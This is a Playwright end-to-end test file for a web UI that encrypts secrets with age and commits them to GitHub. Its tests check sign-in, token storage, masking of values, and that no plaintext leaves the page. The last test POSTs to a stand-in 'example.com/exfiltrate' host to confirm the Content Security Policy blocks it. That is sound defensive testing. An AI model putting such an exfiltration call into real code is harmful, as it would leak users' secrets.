/**
 * The web UI end to end (SPEC.md § Web UI) in WebKit on an iPhone and in Chromium. GitHub is the
 * in-memory double from test/fake-github.ts; every request the page makes is recorded, so the tests
 * can prove that no value leaves the page in plaintext.
 */
import { expect, test } from "@playwright/test";
import { FAKE_TOKEN } from "../test/fake-github.js";
import { ageDecrypt } from "../test/helpers.js";
import { REPOSITORY, webFixture } from "../test/web-fixture.js";
import { connect, everything, signIn, storage } from "./support.js";

test("signs in and shows the inventory", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await signIn(page);

  await expect(page.getByRole("heading", { name: "Inventory" })).toBeVisible();
  const hq = page.getByRole("region", { name: "mini/hq" });
  await expect(hq).toContainText("mini · owner");
  await expect(hq.getByRole("listitem").filter({ hasText: "DATABASE_URL" })).toContainText("ok");
  await expect(hq).toContainText("by lipelix");
  const deploy = page.getByRole("region", { name: "ci/deploy" });
  await expect(deploy.getByRole("listitem").filter({ hasText: "NPM_TOKEN" })).toContainText(
    "stale",
  );
  await expect(page.getByRole("link", { name: /1 open request/ })).toBeVisible();
  await expect(page.getByRole("navigation", { name: "Pages" })).toContainText("Requests1");

  // The token stays in sessionStorage unless "Remember" is ticked.
  expect(await page.evaluate(() => localStorage.length)).toBe(0);
  expect(await page.evaluate(() => sessionStorage.getItem("agedrop.session"))).toContain(
    FAKE_TOKEN,
  );
});

test("the sign-in form names a saved token after its repository", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await page.goto("/");
  // A password manager saves the token with the repository as its username (SPEC.md § Sign-in).
  const repository = page.getByLabel("Repository");
  const token = page.getByLabel("Fine-grained token");
  await expect(repository).toHaveAttribute("autocomplete", "username");
  await expect(token).toHaveAttribute("autocomplete", "current-password");
  await expect(token).toHaveAttribute("type", "password");
  await expect(page.getByLabel("Branch")).toHaveAttribute("autocomplete", "off");
  // Both fields sit in the one form, so a filled entry signs in to its own repository.
  const form = page.locator("form.signin");
  await expect(form.locator("#repository")).toHaveCount(1);
  await expect(form.locator("#token")).toHaveCount(1);
});

test("the token hint names the repository to pick on GitHub", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await page.goto("/");
  // GitHub's link cannot preselect repositories, and its form starts on "All repositories".
  const hint = page.locator("#token-hint");
  await expect(hint).toContainText("Only select repositories");
  await expect(hint).toContainText("choose your secrets repository");
  await page.getByLabel("Repository").fill("some-org/vault");
  await expect(hint).toContainText("choose some-org/vault");
  const link = new URL(
    (await page.getByRole("link", { name: "Create a token on GitHub" }).getAttribute("href")) ?? "",
  );
  expect(link.searchParams.get("target_name")).toBe("some-org");
});

test("fulfils a request: one commit, age decrypts it on the host, no plaintext on the wire", async ({
  page,
}) => {
  const { github, miniIdentity } = await webFixture();
  const sent = await connect(page, github);
  await signIn(page);

  await page.getByRole("link", { name: /^Requests/ }).click();
  await page.getByRole("link", { name: /VAPID_PRIVATE_KEY/ }).click();
  await expect(page.getByRole("heading", { name: "mini/hq/VAPID_PRIVATE_KEY" })).toBeVisible();
  await expect(page.getByText("Web Push signing key for plan #50")).toBeVisible();
  await expect(page.getByText("hq plan session #52")).toBeVisible();
  await expect(page.getByText("openssl ecparam -genkey -name prime256v1 -noout")).toBeVisible();
  await expect(page.getByText("Encrypted to mini, owner (2 keys)")).toBeVisible();

  const value = "vapid-throwaway-Zq8RmW3pT7xK";
  await page.getByLabel("Value").fill(value);
  await page.getByRole("button", { name: "Encrypt, commit and close request" }).click();

  await expect(page.getByRole("status")).toContainText(
    "chore(secrets): fulfil mini/hq/VAPID_PRIVATE_KEY (request k7mq2xpa)",
  );
  await expect(page.getByText("Nothing is waiting.")).toBeVisible();

  const commit = github.commits.at(-1);
  expect([...(commit?.changed ?? [])].sort()).toEqual([
    "agedrop.lock",
    "requests/k7mq2xpa.toml",
    "secrets/mini/hq/VAPID_PRIVATE_KEY.age",
  ]);
  const armored = github.files.get("secrets/mini/hq/VAPID_PRIVATE_KEY.age") ?? "";
  expect(armored).toMatch(/^-----BEGIN AGE ENCRYPTED FILE-----\n/);
  expect(await ageDecrypt(armored, miniIdentity)).toBe(value);

  // No request the page made, to any host, carries the value: not in a URL, header or body.
  expect(sent.some((request) => request.body.includes("createCommitOnBranch"))).toBe(true);
  const wire = everything(sent);
  expect(wire).not.toContain(value);
  expect(wire).not.toContain(Buffer.from(value).toString("base64").slice(0, 24));
  expect(wire).not.toContain(encodeURIComponent(value));
  // The token goes to api.github.com and nowhere else.
  for (const request of sent) {
    if (!request.url.startsWith("https://api.github.com/")) {
      expect(JSON.stringify(request)).not.toContain(FAKE_TOKEN);
    }
  }
  expect(await storage(page)).not.toContain(value);
});

test("adds a file-style secret from a file and replaces an env one with a generated value", async ({
  page,
}) => {
  const { github, ownerIdentity } = await webFixture();
  const sent = await connect(page, github);
  await signIn(page);

  await page.getByRole("link", { name: "Add", exact: true }).click();
  await expect(page.getByRole("heading", { name: "Add a secret" })).toBeVisible();
  await page.getByLabel("Scope").selectOption("ci/deploy");
  await page.getByLabel("Secret name").fill("deploy.key");
  await expect(
    page.getByText("File-style secret · secrets/ci/deploy/deploy.key.age"),
  ).toBeVisible();
  const key =
    "-----BEGIN OPENSSH PRIVATE KEY-----\nthrowaway-file-bytes\n-----END OPENSSH PRIVATE KEY-----\n";
  await page.locator('input[type="file"]').setInputFiles({
    name: "id_ed25519",
    mimeType: "application/octet-stream",
    buffer: Buffer.from(key),
  });
  await expect(page.getByText(/id_ed25519 · .* · exact bytes/)).toBeVisible();
  await page.getByRole("button", { name: "Encrypt and commit" }).click();
  await expect(page.getByRole("status")).toContainText("chore(secrets): add ci/deploy/deploy.key");
  expect(
    await ageDecrypt(github.files.get("secrets/ci/deploy/deploy.key.age") ?? "", ownerIdentity),
  ).toBe(key);

  const deploy = page.getByRole("region", { name: "ci/deploy" });
  await deploy.getByRole("link", { name: "Replace ci/deploy/NPM_TOKEN" }).click();
  await expect(page.getByRole("heading", { name: "Replace a secret" })).toBeVisible();
  await expect(page.getByText("replaces the current value")).toBeVisible();
  await page.getByRole("button", { name: "Generate" }).click();
  const generated = await page.locator("#value").inputValue();
  expect(generated).toMatch(/^[A-Za-z0-9_-]{43}$/);
  await page.getByRole("button", { name: "Encrypt and commit" }).click();
  await expect(page.getByRole("status")).toContainText(
    "chore(secrets): replace ci/deploy/NPM_TOKEN",
  );
  await expect(
    page
      .getByRole("region", { name: "ci/deploy" })
      .getByRole("listitem")
      .filter({ hasText: "NPM_TOKEN" }),
  ).toContainText("ok");
  expect(
    await ageDecrypt(github.files.get("secrets/ci/deploy/NPM_TOKEN.age") ?? "", ownerIdentity),
  ).toBe(generated);

  const wire = everything(sent);
  expect(wire).not.toContain("throwaway-file-bytes");
  expect(wire).not.toContain(generated);
  expect(await storage(page)).not.toContain(generated);
});

test("masks values with a font of dots, so AutoFill sees no password field", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await signIn(page);
  await page.getByRole("link", { name: "Add", exact: true }).click();
  await page.getByLabel("Scope").selectOption("ci/deploy");

  // Safari's AutoFill takes a field with -webkit-text-security for a password field (issue #9).
  const masking = (selector: string) =>
    page.locator(selector).evaluate((element) => {
      const style = getComputedStyle(element);
      return {
        security: style.getPropertyValue("-webkit-text-security") || "none",
        // WebKit drops the quotes around a family name, Chromium keeps them.
        font: style.fontFamily.replaceAll('"', ""),
      };
    });
  await expect(page.locator('input[type="password"]')).toHaveCount(0);

  for (const [name, selector] of [
    ["NPM_TOKEN", "#value"],
    ["deploy.key", "#value-text"],
  ] as const) {
    await page.getByLabel("Secret name").fill(name);
    const field = page.locator(selector);
    expect(await masking(selector)).toEqual({ security: "none", font: "agedrop dots" });

    // Any eight characters look the same: eight dots, never their shapes. The shot is the
    // field's inside, without the border and its focus transition.
    const look = async (value: string): Promise<Buffer> => {
      await field.fill(value);
      await field.blur();
      await page.evaluate(() => document.fonts.ready);
      const box = await field.boundingBox();
      if (box === null) throw new Error(`${selector} is not visible`);
      const inset = 6;
      return page.screenshot({
        animations: "disabled",
        clip: {
          x: box.x + inset,
          y: box.y + inset,
          width: box.width - 2 * inset,
          height: box.height - 2 * inset,
        },
      });
    };
    const empty = await look("");
    const latin = await look("aaaaaaaa");
    const mixed = await look("WMiŽ中😀 é");
    expect(latin.equals(empty)).toBe(false);
    expect(mixed.equals(latin)).toBe(true);

    await page.getByLabel("Show").check();
    expect((await masking(selector)).font).not.toContain("agedrop dots");
    expect((await look("WMiŽ中😀 é")).equals(latin)).toBe(false);
    await page.getByLabel("Show").uncheck();
    await field.fill("");
  }
});

test("refuses empty values and invalid names before anything is sent", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await signIn(page);
  await page.getByRole("link", { name: "Add", exact: true }).click();
  await page.getByLabel("Scope").selectOption("mini/hq");
  await page.getByLabel("Secret name").fill("Mixed_Case");
  await expect(page.getByText("Not a valid name")).toBeVisible();
  await page.getByRole("button", { name: "Encrypt and commit" }).click();
  await expect(page.getByRole("alert")).toHaveText("Enter a valid secret name.");
  await page.getByLabel("Secret name").fill("API_TOKEN");
  await page.getByRole("button", { name: "Encrypt and commit" }).click();
  await expect(page.getByRole("alert")).toHaveText("Not written: the value is empty.");
  expect(github.commits).toHaveLength(1);
});

test("lists repository problems and writes nothing while they last", async ({ page }) => {
  const { github } = await webFixture();
  github.push("recipients/mini.pub", "# kind: machine\nAGE-SECRET-KEY-1THROWAWAY\n");
  await connect(page, github);
  await signIn(page);
  await expect(page.getByRole("region", { name: /problems? found/ })).toContainText(
    "recipients/mini.pub: holds a private key",
  );
  await expect(page.getByRole("region", { name: /problems? found/ })).not.toContainText(
    "AGE-SECRET-KEY-1THROWAWAY",
  );
  await page.getByRole("link", { name: "Add", exact: true }).click();
  await page.getByLabel("Scope").selectOption("ci/deploy");
  await page.getByLabel("Secret name").fill("API_TOKEN");
  await page.getByLabel("Value").fill("x");
  await page.getByRole("button", { name: "Encrypt and commit" }).click();
  await expect(page.getByRole("alert")).toContainText("the repository does not validate");
  expect(github.commits).toHaveLength(2);
});

test("says once that a repository without agedrop.toml is not set up", async ({ page }) => {
  const { github } = await webFixture();
  github.push("agedrop.toml", undefined);
  await connect(page, github);
  await signIn(page);

  const notice = page.getByRole("region", { name: "This repository is not set up for agedrop" });
  await expect(notice).toContainText(`${REPOSITORY} has no agedrop.toml on branch main.`);
  await expect(notice).toContainText("agedrop init --owner <name>");
  await expect(page.getByText("defines no scopes yet")).toHaveCount(0);
  await expect(page.getByText("agedrop.toml: missing")).toHaveCount(0);
});

test("says that an agedrop.toml without scopes defines none", async ({ page }) => {
  const { github } = await webFixture();
  github.push("agedrop.toml", 'version = 0\n\n[recipients]\nowners = ["owner"]\n');
  await connect(page, github);
  await signIn(page);

  await expect(page.getByRole("heading", { name: "Inventory" })).toBeVisible();
  await expect(page.getByText("agedrop.toml defines no scopes yet.")).toBeVisible();
  await expect(page.getByRole("region", { name: /not set up/ })).toHaveCount(0);
});

test("a notification's link fills in the repository and opens the fulfil form after sign-in", async ({
  page,
}) => {
  const { github } = await webFixture();
  await connect(page, github);
  const link = `/#/requests/k7mq2xpa?${new URLSearchParams({ repo: REPOSITORY }).toString()}`;
  await page.goto(link);
  await expect(page.getByLabel("Repository")).toHaveValue(REPOSITORY);
  await page.getByLabel("Fine-grained token").fill(FAKE_TOKEN);
  await page.getByRole("button", { name: "Sign in" }).click();
  await expect(page.getByRole("heading", { name: "mini/hq/VAPID_PRIVATE_KEY" })).toBeVisible();

  // The same link for a repository this device is not signed in to says so instead of
  // "Request not open", and offers to add it.
  await page.goto(`/#/requests/k7mq2xpa?repo=someone%2Fother-secrets`);
  await expect(page.getByRole("heading", { name: "Request in another repository" })).toBeVisible();
  await expect(page.getByText(`${REPOSITORY} stays signed in`)).toBeVisible();
  await page.getByRole("link", { name: "Add someone/other-secrets" }).click();
  await expect(page.getByRole("heading", { name: "Add a repository" })).toBeVisible();
  await expect(page.getByLabel("Repository", { exact: true })).toHaveValue("someone/other-secrets");
});

test("a wrong token returns to sign-in with the reason", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await signIn(page, { token: "github_pat_wrong" });
  await expect(page.getByRole("alert")).toContainText("GitHub rejected the token");
  await expect(
    page.getByRole("heading", { name: "Sign in to your secrets repository" }),
  ).toBeVisible();
  expect(await page.evaluate(() => sessionStorage.length + localStorage.length)).toBe(0);
});

test("remembers the session on request and forgets it on sign-out", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await signIn(page, { remember: true });
  await expect(page.getByRole("heading", { name: "Inventory" })).toBeVisible();
  expect(await page.evaluate(() => localStorage.getItem("agedrop.session"))).toContain(FAKE_TOKEN);
  await page.reload();
  await expect(page.getByRole("heading", { name: "Inventory" })).toBeVisible();
  await page.getByRole("button", { name: "Sign out" }).click();
  await expect(
    page.getByRole("heading", { name: "Sign in to your secrets repository" }),
  ).toBeVisible();
  expect(await page.evaluate(() => sessionStorage.length + localStorage.length)).toBe(0);
});

test("the Content Security Policy blocks every host but api.github.com", async ({ page }) => {
  const { github } = await webFixture();
  await connect(page, github);
  await page.goto("/");
  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/exfiltrate", { method: "POST", body: "x" });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});
